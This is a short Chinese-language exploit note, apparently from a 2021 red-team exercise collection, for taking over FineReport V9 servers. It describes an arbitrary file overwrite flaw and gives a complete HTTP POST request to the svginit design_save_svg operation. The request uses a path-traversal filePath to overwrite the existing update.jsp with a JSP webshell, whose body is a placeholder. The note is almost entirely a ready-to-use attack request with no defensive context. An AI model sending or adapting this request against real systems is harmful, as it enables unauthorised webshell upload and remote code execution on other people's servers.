## 帆软 V9getshell

--------------来自hw2021----------------
FineReport V9
注意: 这个漏洞是任意文件覆盖，上传 JSP 马，需要找已存在的 jsp 文件进行覆盖 Tomcat 
启动帆软后默认存在的 JSP 文件:

```
POST	/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp	HTTP/1.1
Host:	192.168.169.138:8080
User-Agent:	Mozilla/5.0	(Windows	NT	10.0;	Win64;	x64)	AppleWebKit/537.36	(KHTML,	like	Gecko)	
Chrome/81.0.4044.92	Safari/537.36
Connection:	close
Accept-Au:	0c42b2f264071be0507acea1876c74
Content-Type:	text/xml;charset=UTF-8
Content-Length:	675	

{"__CONTENT__":"jsp webshell","__CHARSET__":"UTF-8"}	

```
